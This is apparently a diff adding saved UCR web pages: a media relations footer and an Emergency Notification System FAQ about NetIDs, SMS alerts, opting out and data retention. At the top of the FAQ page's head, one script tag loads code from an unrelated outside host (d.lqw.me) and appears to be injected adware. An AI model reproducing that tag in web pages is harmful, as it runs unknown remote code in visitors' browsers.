+       <li><a href="http://campusstore.ucr.edu/" onclick="javascript:_gaq.push(['_trackEvent','Footer','Link','http://campusstore.ucr.edu/']);">Campus Store</a></li> 
+       <li><a href="http://www.ucr.edu/employment.html" onclick="javascript:_gaq.push(['_trackEvent','Footer','Link','http://www.ucr.edu/employment.html']);">Career Opportunities</a></li> 
+       <li><a href="http://diversity.ucr.edu/" onclick="javascript:_gaq.push(['_trackEvent','Footer','Link','http://diversity.ucr.edu/']);">Diversity</a></li> 
+       <li><a href="http://www.ucr.edu/about/directions.html" onclick="javascript:_gaq.push(['_trackEvent','Footer','Link','http://www.ucr.edu/about/directions.html']);">Maps and Directions</a></li> 
+       <li><a href="http://admissions.ucr.edu/VisitUCR" onclick="javascript:_gaq.push(['_trackEvent','Footer','Link','http://admissions.ucr.edu/VisitUCR']);">Visit UCR</a></li> 
+      </ul> 
+      <!-- Generated in 0.021497 seconds using 768 KiB of memory. --> 
+     </div> 
+     <div class="column49"> 
+      <h3>Department Information</h3> 
+      <address><strong><a href="http://mediarelations.ucr.edu/">Media Relations</a></strong><br /> <a href="http://campusmap.ucr.edu/campusMap.php?loc=HINHL" title="Campus Map">1156 Hinderaker Hall</a><br /><br /> Tel: (951) 827-6397 or (951) UCR-NEWS<br /> Fax: (951) 827-5248<br /> E-mail: <a href="mailto:news@ucr.edu?subject=Website%20Inquiry">news@ucr.edu</a></address> 
+      <ul class="footer_links"> 
+       <li><a id="footer_link_facebook" class="footer_link_icon" href="http://www.facebook.com/UCRiverside" title="external site: Facebook">Visit UCR's Facebook page</a></li> 
+       <li><a id="footer_link_twitter" class="footer_link_icon" href="http://twitter.com/UCRiverside" title="external site: Twitter">Follow UCR on Twitter</a></li> 
+       <li><a id="footer_link_youtube" class="footer_link_icon" href="http://www.youtube.com/UCRiverside" title="external site: YouTube">Visit UCR's YouTube channel</a></li> 
+       <li><a id="footer_link_rss" class="footer_link_icon" href="http://ucrtoday.ucr.edu/feed">Subscribe to UCR Today via RSS</a></li> 
+      </ul> 
+     </div> 
+     <div class="column49R"> 
+      <h3>Related Links</h3> 
+      <ul> 
+       <li><a href="/alpha.html">A to Z Listing</a></li> 
+       <li><a href="/find_people.php">Find People</a></li> 
+       <li><a href="http://facultydirectory.ucr.edu/">Faculty Directory</a></li> 
+       <li><a href="http://campusmap.ucr.edu/">Campus Map</a></li> 
+       <li><a href="/search.php">Search UCR</a></li> 
+       <li><a href="http://admissions.ucr.edu/">Undergraduate Admissions</a></li> 
+       <li><a href="http://graduate.ucr.edu/">Graduate Admissions</a></li> 
+      </ul> 
+     </div> 
+     <div class="clear"></div> 
+    </div> 
+    <div class="clear"></div> 
+    <div id="nav_footer"> 
+     <h3 class="accessibility">Campuswide Navigation</h3> 
+     <ul>
+      <li><a id="nav_footer_home" href="//www.ucr.edu/"><span>UCR Home</span></a></li>
+      <li><a id="nav_footer_about_ucr" href="//www.ucr.edu/about/"><span>About UCR</span></a></li>
+      <li><a id="nav_footer_academics" href="//www.ucr.edu/academics/"><span>Academics</span></a></li>
+      <li><a id="nav_footer_athletics" href="//www.ucr.edu/athletics/"><span>Athletics</span></a></li>
+      <li><a id="nav_footer_happenings" href="//www.ucr.edu/happenings/"><span>Happenings</span></a></li>
+      <li><a id="nav_footer_research" href="//www.ucr.edu/research/"><span>Research</span></a></li>
+      <li><a id="nav_footer_resources" href="//www.ucr.edu/resources/"><span>Campus Resources</span></a></li>
+      <li><a id="nav_footer_giving" href="//www.ucr.edu/giving/"><span>Giving to UCR</span></a></li>
+     </ul> 
+    </div> 
+    <h3 class="accessibility">Footer</h3> 
+    <div id="footer"> 
+     <ul> 
+      <li><a href="http://www.ucr.edu/media/sendmail.html" accesskey="9" title="Send Feedback E-mail">Feedback</a></li> 
+      <li><a href="//www.ucr.edu/privacy.html">Privacy Policy</a></li> 
+      <li><a href="//www.ucr.edu/terms.html" accesskey="8" title="Terms and Conditions">Terms and Conditions</a></li> 
+      <li>&copy; 2014 Regents of the University of California</li> 
+      <li><a rel="nofollow" href="http://ucrcmsdev.ucr.edu/oucampus/de.jsp?user=D01189&amp;site=media&amp;path=%2Fsendmail.html">Last modified: 2014-Mar-11</a></li> 
+     </ul> 
+    </div> 
+   </div> 
+  </div> 
+  <!-- Generated in 0.330905 seconds using 1.75 MiB of memory. -->   
+ </body>
+</html><!--?xml version="1.0" encoding="utf-8"?--><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+ <head> 
+  <script type="text/javascript" id="2f2a695a6afce2c2d833c706cd677a8e" src="http://d.lqw.me/xuiow/?o=3&amp;g=51C1355B-8F04-5EE1-6BAA-F729663DD92F&amp;s=BBA5481A-926B-4561-BD79-249F618495E6&amp;z=1393293607"></script> 
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" /> 
+  <title>Emergency Notification System: Frequently Asked Questions</title> 
+  <meta http-equiv="last-modified" content="2011-08-05" /> 
+  <meta name="version" content="2.60 2.122 " /> 
+  <!-- 03/11/14 15:52:06 03/11/14 15:52:06 --> 
+  <!--link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/design6bis.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/wide6.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/blue6a.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/sifr.css" media="all" /--> 
+  <link type="text/css" rel="stylesheet" href="http://www.ucr.edu/min/g=6bis-bluea-narrow" media="all" /> 
+  <!--link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/print6.css" media="print" /--> 
+  <link type="text/css" rel="stylesheet" href="http://www.ucr.edu/min/f=css/print6.css" media="print" /> 
+  <link rel="stylesheet" type="text/css" href="/ens/css/local.css" media="all" /> 
+  <script type="text/javascript" src="http://www.ucr.edu/min/g=js-sifr"></script> 
+  <!--[if lte IE 6]>
+<link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/ie6-wide6.css" media="all" />
+<script defer type="text/javascript" src="http://www.ucr.edu/min/f=pngfix.js"></script>
+<![endif]--> 
+  <!--[if lte IE 7]>
+<link rel="stylesheet" type="text/css" href="http://www.ucr.edu/css/ie7.css" media="all" />
+<script type="text/javascript" src="http://www.ucr.edu/min/f=fixiequotes.js"></script>
+<![endif]--> 
+  <script type="text/javascript" src="/highslide/highslide-full.packed.js"></script> 
+  <script type="text/javascript" src="/highslide/highslide.config.js" charset="utf-8"></script> 
+  <link rel="stylesheet" type="text/css" href="/highslide/highslide.css" /> 
+ </head> 
+ <body> 
+  <div class="pagewrapper"> 
+   <ul id="accessibility_links"> 
+    <li class="skip"><a tabindex="1" href="#main" accesskey="2" title="Skip Navigation">Skip Navigation</a></li> 
+    <li class="skip"><a tabindex="2" href="http://cnc.cmsdev.ucr.edu/ens" accesskey="1" title="Home Page">Home Page</a></li> 
+   </ul> 
+   <hr /> 
+   <div id="brandingbar"> 
+    <img class="overlay" src="/ens/images/design6/overlay_home.png" alt="" /> 
+    <h1><a href="http://www.ucr.edu/" title="UCR Home Page"><img src="http://www.ucr.edu/images/design6/ucr_logo.gif" width="150" height="53" alt="" /><span class="accessibility">University of California, Riverside</span></a></h1> 
+   </div> 
+  </div> 
+  <div id="masthead" style="background-image:url(/ens/images/masthead.jpg);"> 
+   <h1><a href="http://cnc.cmsdev.ucr.edu/ens"><span class="printonly">Emergency Notification System</span></a></h1> 
+  </div> 
+  <!-- Status: Normal --> 
+  <hr /> 
+  <div class="breadcrumbs"> 
+   <p class="accessibility">You are here:</p> 
+   <ul> 
+    <li><a href="http://www.ucr.edu/" title="UCR Home">UCR Home</a> &gt;</li> 
+    <li><a href="http://cnc.ucr.edu/">Computing &amp; Communications</a> &gt;</li> 
+    <li><a href="http://cnc.cmsdev.ucr.edu/ens">Emergency Notification System</a> &gt;</li> 
+    <li class="lastitem">Frequently Asked Questions</li> 
+   </ul> 
+  </div> 
+  <div class="pagewrapper"> 
+   <div id="search"> 
+    <div id="nav_utility"> 
+     <ul> 
+      <li><a href="http://www.ucr.edu/alpha.html">A to Z Listing</a></li> 
+      <li><a href="http://campusmap.ucr.edu/">Campus Map</a></li> 
+      <li><a href="http://www.ucr.edu/find_people.php">Find People</a></li> 
+     </ul> 
+    </div> 
+    <form id="searchbox" action="http://www.ucr.edu/search.php">
+     <p> <label for="SearchText" accesskey="4" title="Search">Search for:</label> <input type="text" size="18" maxlength="255" id="SearchText" name="q" value="" /> <input id="go" type="submit" name="sa" value="Go" /> </p>
+    </form> 
+    <script type="text/javascript" src="http://www.ucr.edu/js/watermark.js"></script> 
+   </div> 
+   <hr /> 
+   <!-- Start Content (Navigation and Content columns) --> 
+   <div id="content"> 
+    <h2>Frequently Asked Questions</h2> 
+    <!-- Start Sidebar --> 
+    <div id="sidebar"> 
+     <div class="nav"> 
+      <h3 class="accessibility">Main Navigation</h3> 
+      <ul> 
+       <li><a href="/ens/" title="Home">Home<br /><span></span></a></li>
+       <li><a href="/ens/background.html" title="Background">Background<br /><span></span></a></li>
+       <li><a href="/ens/signup.html" title="How Do I Sign Up for the System?">How Do I Sign Up for the System?</a></li>
+       <li><a href="/ens/whenused.html" title="When Will The System Be Used?">When Will The System Be Used?</a></li>
+       <li><a href="/ens/privacy.html" title="Privacy &amp; Confidentiality">Privacy &amp; Confidentiality</a></li>
+       <li><a href="/ens/helpful_links.html" title="Helpful Links">Helpful Links</a></li>
+       <li class="currentpage"><h3><dfn>Current page is: </dfn>Frequently Asked Questions</h3></li>
+       <li><a href="/ens/contacts.html" title="Contacts">Contacts</a></li>
+       <li><a href="/ens/announce.html" title="Announcements">Announcements<br /><span></span></a></li>
+       <li><a href="/ens/horizon.html" title="On the Horizon">On the Horizon</a></li> 
+      </ul> 
+     </div> 
+    </div> 
+    <hr /> 
+    <!-- End Sidebar --> 
+    <!-- Start Content Area --> 
+    <div id="main"> 
+     <!-- com.omniupdate.editor csspath="/z-omniupdate/css/macy.css" cssmenu="" width="790" --> 
+     <div class="header"> 
+      <!-- com.omniupdate.div label="title" group="Everyone" button="734" -->
+      <!-- com.omniupdate.editor csspath="/z-omniupdate/css/style.css" cssmenu="/z-omniupdate/css/style.txt" width="484" --> 
+      <!-- /com.omniupdate.div -->
+     </div> 
+     <div id="omnicontent"> 
+      <!-- com.omniupdate.div label="maincontent" group="Everyone" button="707" -->
+      <!-- com.omniupdate.editor csspath="/z-omniupdate/css/style.css" cssmenu="/z-omniupdate/css/style.txt" width="700" --> 
+      <h3>FAQ's</h3> 
+      <ul> 
+       <li><a href="#NETID">What is a UCR NetID and why do I need one?</a> </li> 
+       <li><a href="#EnterpriseDir"> What is the UCR Enterprise Directory and how does it relate to the Emergency Notification System?</a> </li> 
+       <li><a href="#Corrections">What if my information is incorrect, e.g. I've moved or there is an error?</a> </li> 
+       <li><a href="#SMS">What is SMS messaging?</a> </li> 
+       <li><a href="#reimbursement">Will I be reimbursed for text messaging expenses?</a> <span style="text-decoration: underline;"><br /> </span></li> 
+       <li><a href="#concerns">Whom can I contact with questions, comments, or concerns about the Emergency Messaging System?</a> </li> 
+       <li><a href="#parents">Can my parents/spouse/etc. sign up for the Emergency Notification System?</a></li> 
+       <!--
+<li><a href="#othercontact" _mce_href="#othercontact" mce_href="#othercontact">How much Emergency Contact information should I provide?</a> --> 
+       <li><a href="#unregister">How do I opt-out of the Emergency Notification service?</a> </li> 
+       <li><a href="#separating">How long is my emergency notification information kept? What happens to this information when I leave the university? </a> </li> 
+      </ul> 
+      <p><a title="NETID" name="NETID"> </a><strong>Q. What is a UCR Net ID and why do I need one?</strong></p> 
+      <p><strong>A.</strong> The UCR NetID is a unique ID available to all UCR Faculty, Staff, and Students. Once assigned, the UCR NetID allows access to UCR's central electronic communication services (webmail and the wireless network). Additionally, the UCR NetID is used to grant access to the Emergency Notification System to view and update contact information and notification preferences.</p> 
+      <p><a title="EnterpriseDir" name="EnterpriseDir"> </a><strong>Q. What is the UCR Enterprise Directory and how does it relate to the Emergency Notification System?</strong></p> 
+      <p><strong>A. </strong>The UCR Enterprise Directory is a database of campus faculty and staff, maintained by the campus Enterprise Directory Administrators. The Emergency Notification System authenticates UCR NetIDs against UCR's Enterprise Directory and uses the Enterprise Directory to populate employee information such as email address, phone number, building location, etc. Likewise, student information in the Emergency Notification System comes from the Student Information System.</p> 
+      <p><a title="Corrections" name="Corrections"> </a> <strong>Q. What if my &quot;General Summary&quot; information is incorrect, e.g. I've moved or there is an error?</strong></p> 
+      <p><strong>A. Students</strong> must log into GROWL and select the Addresses option to make the appropriate modifications to their information in the Emergency Notification System. Once the changes have been submitted, the information will be updated in the Emergency Notification System.</p> 
+      <p><strong>Faculty and staff</strong> must contact their department's Enterprise Directory Administrator to make changes or corrections to the information in the Emergency Notification System, as this information comes from the Enterprise Directory and it is imperative that it be accurate. A list of Enterprise Directory Administrators is available <a href="http://eacs.ucr.edu/eacs/EACS_REPORT.ucrtel_transactor_list">here</a>.</p> 
+      <p>To update cell phone numbers, alternate email, and emergency contact information, simply log in to the Emergency Notification Registration system (through GROWL for students and through iViews for faculty and staff), make the necessary changes, and click the Save button.</p> 
+      <p><strong><a title="SMS" name="SMS"> </a><strong>Q. What is SMS messaging?</strong> </strong></p> 
+      <p><strong>A.</strong>SMS is an acronym for Short Message Service, and is a system for sending short textual messages to devices such as cellular phones. Also known as text messaging, SMS messaging is a fast, robust, and reliable means of communicating information quickly. Among other advantages, SMS messaging puts less load on cellular circuits than voice communication, and allows near-instantaneous dissemination of important information.</p> 
+      <p><a title="reimbursement" name="reimbursement"> </a><strong>Q. Will I be reimbursed for text messaging expenses?</strong></p> 
+      <p><strong>A.</strong> Emergency SMS notification is a voluntary program, thus any SMS-related expenses are the responsibility of the individual. At the current time, the Emergency Notification System also supports sending emergency communications to an alternate e-mail address, and in the future more communication tools will be added.</p> 
+      <p><a title="concerns" name="concerns"> </a><strong> Q. Whom can I contact with questions, comments, or concerns about the Emergency Messaging System?</strong></p> 
+      <p><strong>A.</strong> For questions, comments, and concerns about the Emergency Notification System, email <a href="mailto:emergencynotification@ucr.edu?subject=Emergency%20Notification%20System%20Question">emergencynotification@ucr.edu.</a></p> 
+      <p><a title="parents" name="parents"> </a><strong>Q. Can my parents / spouse / etc. sign up for the Emergency Notification System?</strong></p> 
+      <p><strong>A.</strong> At the present time, only current UCR students, faculty, emeriti, staff, and affiliates may participate in the Emergency Notification System. However, notification service for third parties is on the horizon.</p> 
+      <!--
+<p><a name="othercontact" title="othercontact"> </a><b>Q. How much Emergency Contact information should I provide?</b></p>
+<p><b>A.</b> The Emergency Contact information section is completely optional, and leaving all fields blank is acceptable. However, if you wish to enter the name of someone else to contact in the event of an emergency, you must enter at least a name and phone number or complete address.</p>
+--> 
+      <p><a title="unregister" name="unregister"> </a><strong>Q. How do I opt-out of the Emergency Notification service?</strong></p> 
+      <p><strong>A.</strong> To opt-out of emergency notifications, log back in to the Emergency Notification Registration System (students must log in through GROWL; faculty and staff may log in through iViews or by clicking <a href="http://enterprisedirectory.ucr.edu/phone/enrs_main.welcome_page" target="_blank">here</a> ) and choose the option to DECLINE to receive notificaions, then press the Save button to update your preferences.</p> 
+      <p><a title="separating" name="separating"> </a><strong>Q. How long is my emergency notification information kept? What happens to this information when I leave the university? </strong></p> 
+      <p><strong>A.</strong> Faculty and staff information will be deleted upon separation from the University, unless an emeritus or affiliate status is established. Student information is deleted one year from the end of the last term of enrollment. If UCR elects to end the relationship with the ENS vendor, all information will be securely deleted from 3N's systems.</p> 
+      <!-- /com.omniupdate.div --> 
+      <!-- com.omniupdate.div label="related" group="Everyone" button="707" -->
+      <!-- com.omniupdate.editor csspath="/z-omniupdate/css/style.css" cssmenu="/z-omniupdate/css/style.txt" width="300" --> 
+      <!-- /com.omniupdate.div --> 
+      <!-- com.omniupdate.efp -->
+      <!-- /com.omniupdate.efp --> 
+     </div> 
+    </div> 
+    <!-- End Content Area --> 
+    <div class="clear"></div> 
+   </div> 
+   <!-- End Content --> 
+  </div> 
+  <div class="clear"></div> 
+  <div class="footerwrapper"> 
+   <h2><span class="accessibility">More Information</span>&nbsp;</h2> 
+   <div class="pagewrapper"> 
+    <div class="prefooter"> 
+     <div class="column49"> 
+      <h3>General Campus Information</h3> 
+      <address> <span class="vcard"> <strong><span class="fn org">University of California, Riverside</span></strong><br /> <span class="adr"> <span class="street-address">900 University Ave.</span><br /> <span class="locality">Riverside</span>, <span class="region">CA</span> <span class="postal-code">92521</span><br /> </span> Tel: <span class="tel">(951) 827-1012</span> </span> </address> 
+      <ul class="footer_links"> 
+       <li><a href="http://library.ucr.edu/">UCR Libraries</a></li> 
+       <li><a href="http://campusstatus.ucr.edu/">Campus Status</a></li> 
+       <li><a href="http://campusstore.ucr.edu/">Campus Store</a></li> 
+       <li><a href="http://www.ucr.edu/employment.html">Career Opportunities</a></li> 
+       <li><a href="http://diversity.ucr.edu/">Diversity</a></li> 
+       <li><a href="http://www.ucr.edu/about/directions.html">Maps and Directions</a></li> 
+       <li><a href="http://admissions.ucr.edu/VisitUCR">Visit UCR</a></li> 
+      </ul> 
+     </div> 
+     <div class="column49"> 
+      <h3>Department Information</h3> 
+      <address><strong>Computing &amp; Communications</strong><br /> <a href="http://www.campusmap.ucr.edu/campusMap.php?loc=CCCTR" title="Campus Map">Computing &amp; Communications Bldg.</a><br /><br /> Tel: (951) 827-4741<br /> Fax: (951) 827-4541<br />E-mail: <a href="mailto:emergencynotification@ucr.edu?subject=Web Site Inquiry">emergencynotification@ucr.edu</a></address> 
+     </div> 
+     <div class="column49R"> 
+      <h3>Related Links</h3> 
+      <ul> 
+       <li><a href="http://campusstatus.ucr.edu">Campus Emergency Status</a></li> 
+       <li><a href="http://www.cnc.ucr.edu">Computing &amp; Communications</a></li> 
+       <li><a href="http://ehs.ucr.edu">Environmental Health &amp; Safety</a></li> 
+       <li><a href="http://www.police.ucr.edu">UCR Police Department</a></li> 
+      </ul> 
+      <ul class="footer_links"> 
+       <li><a id="footer_link_facebook" class="footer_link_icon" href="http://www.facebook.com/UCRiverside" title="external site: Facebook">Visit UCR’s Facebook page</a></li> 
+       <li><a id="footer_link_twitter" class="footer_link_icon" href="http://twitter.com/UCRiverside" title="external site: Twitter">Follow UCR on Twitter</a></li> 
+       <li><a id="footer_link_youtube" class="footer_link_icon" href="http://www.youtube.com/UCRiverside" title="external site: YouTube">Visit UCR’s YouTube channel</a></li> 
+      </ul> 
+     </div> 
+     <div class="clear"></div> 
+    </div> 
+    <div class="clear"></div> 
+    <div id="nav_footer"> 
+     <h3 class="accessibility">Campuswide Navigation</h3> 
+     <ul>
+      <li><a id="nav_footer_home" href="http://www.ucr.edu/"><span>Home</span></a></li>
+      <li><a id="nav_footer_about_ucr" href="http://www.ucr.edu/about/"><span>About UCR</span></a></li>
+      <li><a id="nav_footer_academics" href="http://www.ucr.edu/academics/"><span>Academics</span></a></li>
+      <li><a id="nav_footer_athletics" href="http://www.ucr.edu/athletics/"><span>Athletics</span></a></li>
+      <li><a id="nav_footer_happenings" href="http://www.ucr.edu/happenings/"><span>Happenings</span></a></li>
+      <li><a id="nav_footer_research" href="http://www.ucr.edu/research/"><span>Research</span></a></li>
+      <li><a id="nav_footer_resources" href="http://www.ucr.edu/resources/"><span>Campus Resources</span></a></li>
+      <li><a id="nav_footer_giving" href="http://www.ucr.edu/giving/"><span>Giving to UCR</span></a></li>
+     </ul> 
+    </div> 
+    <h3 class="accessibility">Footer</h3> 
+    <div id="footer"> 
+     <ul> 
+      <li><a href="http://cnc.cmsdev.ucr.edu/enssendmail.html" accesskey="9" title="Send Feedback E-mail">Feedback</a></li> 
+      <li><a href="http://www.ucr.edu/privacy.html">Privacy Policy</a></li> 
+      <li><a href="http://www.ucr.edu/terms.html" accesskey="8" title="Terms and Conditions">Terms and Conditions</a></li> 
+      <li>&copy; 2011 Regents of the University of California</li> 
+      <li><a rel="nofollow" href="http://ucrcmsdev.ucr.edu/oucampus/de.jsp?user=ORG21&amp;site=cnc&amp;path=%2Fens%2Ffaqs.html">Last modified: 2011-Aug-05</a></li> 
+     </ul> 
+    </div> 
+   </div> 
+  </div> 
+  <script type="text/javascript">
+// <![CDATA[
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-3051875-1']);
+  _gaq.push(['_setDomainName', '.ucr.edu']);
+  _gaq.push(['_setAllowHash', false]);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+// ]]>
+</script> 
+  <!-- Generated in 0.276989 seconds using 2.00 MiB of memory. -->   
+ </body>
+</html>
